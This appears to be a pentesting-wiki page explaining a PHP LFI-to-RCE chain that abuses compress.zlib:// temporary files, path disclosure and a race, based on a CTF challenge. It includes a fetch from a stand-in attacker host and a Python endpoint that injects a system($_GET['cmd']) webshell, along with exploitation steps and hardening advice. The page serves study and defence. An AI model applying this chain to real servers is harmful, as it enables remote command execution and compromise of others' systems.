# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STDIO + Path Disclosure

{{#include ../../banners/hacktricks-training.md}}

### `compress.zlib://` and `PHP_STREAM_PREFER_STDIO`

The interesting file is the **seekability backing file**, not a file containing decompressed output. In current php-src, `php_stream_gzopen()` opens the resource nested after `compress.zlib://` with `STREAM_MUST_SEEK | STREAM_WILL_CAST`. When that inner resource is a non-seekable HTTP stream, PHP selects `PHP_STREAM_PREFER_STDIO`, creates a real temporary file with `php_stream_fopen_tmpfile()`, and copies the raw HTTP response body into it before zlib reads from it.<sup>[[1]](#references)[[3]](#references)</sup>

The relevant call chain remains:

```c
innerstream = php_stream_open_wrapper_ex(path, mode,
    STREAM_MUST_SEEK | options | STREAM_WILL_CAST,
    opened_path, context);

/* _php_stream_make_seekable() */
*newstream = php_stream_fopen_tmpfile();
```

Therefore, a call such as the following can make PHP fetch an attacker-controlled response and stage its entity body in a named temporary file while the upstream connection remains incomplete:

```php
file_get_contents("compress.zlib://http://attacker.example/payload")
```

> The bytes appended by the attacker must be **raw PHP bytes**, not another gzip member. The later LFI includes the temporary backing file by its local pathname, so it parses the raw HTTP body stored before decompression. Sending gzip-compressed PHP would only place gzip bytes in the file being included.<sup>[[1]](#references)</sup>

### Exploitation requirements

This technique normally needs all of the following.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

- Control of a complete filename passed to a filesystem function, so `compress.zlib://http://...` reaches the zlib wrapper. A suffix forcibly appended after user input will generally break the remote URL.
- The zlib extension and the nested HTTP wrapper. Although the compression wrapper itself is not gated by `allow_url_fopen`, the nested `http://` fetch requires `allow_url_fopen=On`; `allow_url_include` is **not** required because the remote URL is read by `file_get_contents()` and the final include targets a local path.<sup>[[1]](#references)[[4]](#references)</sup>
- A writable PHP temporary directory and an LFI sink allowed to include from that directory.
- A path-disclosure primitive that reveals the live file, commonly named with a `php` prefix. The hxp challenge combined the disclosed per-request `TMPDIR` with an unintended directory listing to recover the complete filename.<sup>[[1]](#references)[[3]](#references)</sup>
- At least two concurrently served requests: one worker remains blocked copying the attacker's HTTP body, while another checks and includes the disclosed local path.
- A check-then-use window, such as `file_get_contents($path)` followed by `include($path)`, where the same mutable file can change between validation and execution.

If only a plain LFI is available and there is no wrapper-controlled fetch or path leak, use a technique matching the available primitive, such as [phpinfo() temporary uploads](lfi2rce-via-phpinfo.md), [temporary file upload races](lfi2rce-via-temp-file-uploads.md), or [eternal waiting](lfi2rce-via-eternal-waiting.md).

### Race condition to RCE

The hxp 36C3 CTF `includer` challenge demonstrated the complete chain.<sup>[[1]](#references)</sup>

1. Start request **A** with `file=compress.zlib://http://attacker/...`.
2. Reply with valid HTTP headers, advertise a body longer than the harmless prefix, send only benign raw bytes, and keep the socket open. PHP creates and progressively fills its seekable temporary backing file.
3. Disclose the temporary directory and exact `php...` filename while request A is blocked. In the original challenge, a long attacker-controlled response field also filled PHP's output buffer so the random directory was returned before the request completed.
4. Start request **B** using the literal temporary pathname. Its `file_get_contents()` validation sees only the harmless prefix.
5. Immediately append raw `<?php ... ?>` bytes through request A's still-open upstream socket.
6. Win the race so request B executes the changed file in its subsequent `include_once()`.

A minimal attacker-controlled HTTP endpoint behaves like this:

```python
conn.sendall(b"HTTP/1.1 200 OK\r\n"
             b"Content-Length: 100000\r\n"
             b"Connection: close\r\n\r\nSAFE\n")
# Leak the php... path and start the local check/include request here.
wait_for_check_request()
conn.sendall(b'<?php system($_GET["cmd"]); ?>')
```

The large declared `Content-Length` is a synchronization primitive: it prevents PHP from observing end-of-body after the safe prefix. Do not close the connection until the payload has been copied and the competing local include has run.<sup>[[1]](#references)</sup>

### Common failure cases

- **Compressed payload instead of raw bytes:** the local include does not pass the backing file through `compress.zlib://` again.
- **No exact path disclosure:** knowing only the temp directory is insufficient unless a separate listing, glob, or filename oracle exposes the random suffix.
- **Only one PHP worker:** the request holding the upstream connection can starve the request needed to disclose or include the file.
- **Payload sent too early:** `<?` is present when the content check runs and is rejected.
- **Payload sent too late:** the include has already parsed the benign version.
- **Premature EOF or incorrect framing:** PHP finishes copying, closes the stream, and removes the temporary file before it can be included.
- **Buffered output:** the directory/path disclosure may not reach the attacker while request A is blocked; proxy buffering can defeat output-padding or flush-based synchronization.
- **Filesystem restrictions:** a non-writable temp directory, `open_basedir`, container separation, or different worker filesystems can make the path unavailable to the LFI request.

### Hardening

Do not pass user-controlled wrapper strings to filesystem functions or dynamic includes. Map an allowlisted identifier to a canonical local file and eliminate content-check-then-include patterns. Disable `allow_url_fopen` when remote filesystem access is unnecessary,<sup>[[4]](#references)</sup> and prevent web access or directory indexing of PHP temporary directories. These controls remove the wrapper fetch, pathname oracle, or mutable-code race needed by the chain.



## References

- [1] [hxp 36C3 CTF 2019 - includer](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)
- [2] [Barb'hack 2022: Leveraging PHP Local File Inclusion to achieve universal RCE](https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/)
- [3] [php-src at commit `70603b9`](https://github.com/php/php-src/tree/70603b9465f52a33bc5bb51ed4580a9f5ed56b34)
- [4] [PHP manual: Filesystem and Streams Configuration](https://www.php.net/manual/en/filesystem.configuration.php)
{{#include ../../banners/hacktricks-training.md}}
